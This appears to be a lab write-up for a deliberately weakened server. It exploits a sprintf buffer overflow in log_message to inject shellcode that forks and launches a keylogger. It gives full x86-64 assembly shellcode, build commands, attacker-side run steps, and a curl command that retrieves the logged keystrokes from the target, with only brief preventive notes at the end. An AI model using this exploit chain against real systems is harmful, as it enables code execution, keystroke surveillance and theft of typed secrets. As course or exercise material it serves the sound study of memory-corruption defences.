# <span style="color: yellow;">Scenario 1</span>

## Context
***
- server_data is <span style="color: green;">accessible</span>
- stack canaries are <span style="color: red;">disabled</span>
- DEP is <span style="color: red;">disabled</span>
- ASLR is <span style="color: red;">disabled</span>

## Exploit overview
***
This exploit launches ./keylog with code injection. The payload is injected through a buffer and exploits a buffer overflow vulnerability in `log_message` to overwrite the return address.

```c
sprintf(&var_458, "== Request from %-15s at fd %-10â€¦", &dst, ((uint64_t)*(int32_t*)client_fd), message);
```

## Challenges & Decisions
***

- We could crash the server before sending the actual exploit but we are the only people connecting.
- We don't have to alter the standard keylogger.
- The most challenging aspect of this task is allowing the attacker to access the logged keyboard events after launching the keylogger. Without forking the process, the attacker cannot access the ```logged_keyboard_events.txt``` file from their machine.


### Injected payload
```asm
.intel_syntax noprefix
.global _start

.section .text
_start:
    xor edx, edx                    ; clear edx
    xor esi, esi                    ; clear esi
    xor eax, eax                    ; clear eax
    mov al, 57                      ; mov sys call num 57 in 8 LSB of rax (fork)
    syscall                         ; syscall fork
    test rax, rax                   ; check if parent of child runs
    jnz parent                      ; parent exits
child:
    mov rcx, 0x676f6c79656b2f2e     ; child keeps executing (move ./keylog in rcx)   golyek/. -> ./keylog backwards
    push rax                        ; push null bytes to terminate the string
    push rcx                        ; push string backwards
    mov rdi, rsp                    ; mov pointer to string in rdi
    mov al, 59                      ; mov 59 in 8 LSB of rax (execve)
    syscall                         ; syscall execve
parent: 
    xor eax, eax                    ; clear eax
    mov al, 60                      ; mov sys call 60 in 8 LSB of al (exit)
    xor edi, edi                    ; clear edi
    syscall                         ; exit(0)
```
Compile with:
```shell
$ gcc -nostdlib -static shellcode.s -o shellcode
$ objcopy --dump-section .text=raw-shell shellcode
```

## Execution Instructions
***
Victim-side:
```shell
$ sudo ./launch_scenario 1
```
```shell
$ sudo cp keylogger server/server_data/keylog  
```
Attacker-side:
```shell
$ python3 server_sc1.py TARGET_IP TARGET_PORT
```
```shell
$ curl http://{TARGET}:{TARGET_PORT}/logged_keyboard_events.txt
```

## Preventive Measures
***
- Safer alternatives like ```snprintf``` should be used.
- Data Execution Prevention (mostly) prevents code injection unless disabled by the attacker.
- Although stack canaries and secure library function make code injection harder, they do not always prevent it outright.